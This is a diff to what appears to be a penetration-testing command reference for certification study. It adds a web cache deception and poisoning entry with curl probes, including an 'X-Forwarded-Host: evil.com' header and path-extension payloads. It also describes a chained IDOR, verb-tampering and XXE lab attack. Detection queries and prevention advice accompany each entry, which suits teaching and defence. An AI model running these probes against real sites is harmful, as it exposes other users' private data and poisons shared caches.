+        "sigma_rules": "cloud_leaked_credential_verification",
+        "prevention": "Pre-commit secret scanning (gitleaks hook); rotate any committed secret and purge history; use short-lived credentials + secret managers; never commit keys; scan repos continuously; enable GitHub secret scanning/push protection.",
+        "sources": [
+          "trufflesecurity",
+          "https://attack.mitre.org/techniques/T1552/001/"
+        ]
+      }
     },
     {
       "id": "tshark-pcap-creds",
@@ -175688,6 +176239,89 @@ const COMMAND_DATA = {
         }
       },
       "explain": "End-to-end Web Attacks skills-assessment chain that combines all three module techniques: enumerate users through a REST IDOR to find the admin account, steal the admin's password-reset token through a second IDOR, use HTTP verb tampering (POST->GET) to bypass the reset endpoint's method/token enforcement, log in as admin, then abuse an admin-only XML endpoint with XXE to read the flag.\nKey sections:\n  1. Step 1 - mass IDOR: enumerate every user through the REST API to find the admin\n  2. Step 2 - inspect the protected password-reset request (needs a per-uid token)\n  3. Step 3 - steal the admin's reset token through a second IDOR\n  4. Step 4 - verb tampering: resend the reset as GET to bypass the method/token enforcement\n  5. Step 5 - log in as the admin with the new password, locate the admin-only XML endpoint (addEvent.php)\nBased on M23 Skills Assessment.\nFour vulnerabilities chained: (1) REST IDOR at /api.php/user/<uid> leaks every profile - the admin is spotted by company=\"Administrator\"; (2) a second IDOR at /api.php/token/<uid> hands out any user's reset token; (3) the reset endpoint only enforces its check on POST, so switching to GET (verb tampering) applies the password change with the stolen token; (4) the admin-only addEvent.php parses attacker XML with no entity restrictions, giving XXE local file read via php://filter."
+    },
+    {
+      "id": "web-cache-deception",
+      "name": "Web Cache Deception & Poisoning",
+      "command": "curl \"https://<target>/account/settings/profile.css\"",
+      "description": "Web cache deception tricks a caching layer (CDN/reverse proxy) into storing a victims private, authenticated response under a path the attacker can later fetch. By appending a cacheable-looking extension (/account.css, /profile.php/x.js) the attacker makes the cache key on a static path while the app serves dynamic private content. Related: cache poisoning via unkeyed headers. Leaks other users data without credentials.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Web Exploitation",
+      "subcategory": "HTTP Attacks",
+      "certifications": [
+        "CWES",
+        "CPTS"
+      ],
+      "primary_cert": "CWES",
+      "source": "PortSwigger / Omer Gil research",
+      "tags": [
+        "web-cache-deception",
+        "cache-poisoning",
+        "cdn",
+        "caching",
+        "http",
+        "info-leak"
+      ],
+      "mitre": [
+        "T1190",
+        "T1539"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== WEB CACHE DECEPTION (steal another users cached private page) ===\n  # 1. Victim is tricked into visiting a crafted URL that looks static:\n  https://<target>/account/settings/notexist.css\n  # 2. App ignores the extension and returns the victims private page\n  # 3. CDN caches it under the .css path (static ext = cache rule)\n  # 4. Attacker fetches the SAME path unauthenticated and reads it:\n  curl \"https://<target>/account/settings/notexist.css\"\n\n=== TEST EXTENSIONS / DELIMITERS ===\n  /account.css   /account/x.js   /account%0a.css   /account;.css\n  /account%2fx.css   /account?x.css   /account#.css\n  # Compare authed response vs the cached unauthed fetch\n\n=== CACHE POISONING (unkeyed input) ===\n  # Find headers that change the response but are NOT in the cache key:\n  curl https://<target>/ -H \"X-Forwarded-Host: evil.com\"\n  curl https://<target>/ -H \"X-Forwarded-Scheme: http\"\n  # If reflected + cached, poison for all users (stored XSS/redirect)\n\n=== TOOLS ===\n  # Burp \"Param Miner\" - discover unkeyed headers/params\n  # Burp \"Web Cache Deception Scanner\" extension\n\n=== DETECT CACHING ===\n  curl -sI https://<target>/path | grep -iE \"x-cache|age|cf-cache-status\"\n  # X-Cache: HIT / Age > 0 / CF-Cache-Status: HIT = cached\n\n=== IMPACT ===\n  - Steal PII / tokens from other users cached responses\n  - Cache-poisoned XSS / open redirect affecting all users",
+      "examples": [
+        {
+          "label": "Fetch victim-cached private page",
+          "command": "curl \"https://target.com/account/settings/x.css\""
+        },
+        {
+          "label": "Check cache headers",
+          "command": "curl -sI \"https://target.com/account/x.css\" | grep -iE \"x-cache|age|cf-cache-status\""
+        },
+        {
+          "label": "Cache poisoning via unkeyed header",
+          "command": "curl https://target.com/ -H \"X-Forwarded-Host: evil.com\""
+        }
+      ],
+      "references": [
+        {
+          "title": "PortSwigger - Web cache deception",
+          "url": "https://portswigger.net/web-security/web-cache-deception"
+        },
+        {
+          "title": "PortSwigger - Web cache poisoning",
+          "url": "https://portswigger.net/web-security/web-cache-poisoning"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "web-request-smuggling",
+          "note": "Smuggling can also poison caches/queues.",
+          "rel": "alternative"
+        },
+        {
+          "id": "web-crlf-injection",
+          "note": "CRLF can inject cacheable malicious responses.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Caches often key on URL/extension and apply static-file rules by suffix, while the origin app routes on the path prefix and ignores the fake extension - so a private dynamic response gets cached under an attacker-predictable static key. Cache poisoning adds the twist of unkeyed request inputs reflected into cached responses.",
+        "prerequisites": "A caching layer (CDN/proxy) with suffix/path-based rules in front of an app that serves dynamic content regardless of extension.",
+        "impact": "Disclosure of other users private/authenticated data; cache-poisoned XSS or redirects affecting all users.",
+        "detection": "[MITRE T1190/T1539] Requests to authenticated paths with odd static extensions (/account/*.css); repeated unauthenticated fetches of such paths; cache HITs on personalized URLs; anomalous X-Forwarded-* headers.",
+        "artifacts": "Cache/CDN logs showing HITs on user-specific paths; requests with mismatched extensions; unkeyed header reflection.",
+        "splunk_spl": "index=web (uri_path=\"*/account*\" OR uri_path=\"*/profile*\") (uri_path=\"*.css\" OR uri_path=\"*.js\" OR uri_path=\"*.jpg\")\n| stats count by src_ip, uri_path",
+        "elastic_kql": "url.path:(*account* or *profile*) and url.extension:(css or js or jpg)",
+        "sentinel_kql": "_Im_WebSession\n| where Url matches regex @\"/(account|profile|settings).*\\.(css|js|jpg|png)$\"\n| project TimeGenerated, SrcIpAddr, Url",
+        "sigma_rules": "web_cache_deception_attempt",
+        "prevention": "Cache only by content-type/Cache-Control from origin, not URL suffix; never cache authenticated responses (Cache-Control: no-store, private); normalize paths; include all response-affecting inputs in the cache key; disable caching of personalized endpoints.",
+        "sources": [
+          "PortSwigger",
+          "https://attack.mitre.org/techniques/T1190/"
+        ]
+      }
     },
     {
       "type": "command",
@@ -192065,8 +192699,8 @@ const COMMAND_DATA = {
       }
     }
   ],
-  "totalCommands": 1082,
-  "buildDate": "2026-11-11T05:30:43.306Z",
+  "totalCommands": 1089,
+  "buildDate": "2026-11-11T05:35:44.141Z",
   "certifications": [
     "CDSA",
     "CPTS",
